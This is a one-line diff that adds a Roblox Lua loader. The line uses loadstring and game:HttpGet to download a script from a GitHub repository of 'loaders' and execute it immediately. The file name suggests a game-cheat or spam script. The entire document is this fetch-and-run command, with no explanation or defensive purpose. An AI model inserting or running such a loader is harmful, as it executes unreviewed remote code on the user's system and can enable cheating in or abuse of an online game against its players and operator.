@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/huntress-nightmare-spam5-e4ydoyjhgqgj7s.lua"))()
